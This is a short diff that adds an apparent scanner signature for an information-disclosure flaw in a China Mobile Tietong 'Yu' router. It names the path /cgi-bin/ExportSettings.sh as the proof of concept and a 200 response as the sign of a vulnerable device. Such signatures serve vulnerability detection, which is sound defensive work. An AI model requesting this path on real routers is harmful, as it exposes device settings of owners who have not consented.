@@ -1,0 +1,3 @@
+name: "中移铁通禹路由器信息泄露漏洞"
+poc: "/cgi-bin/ExportSettings.sh"
+status_code: 200
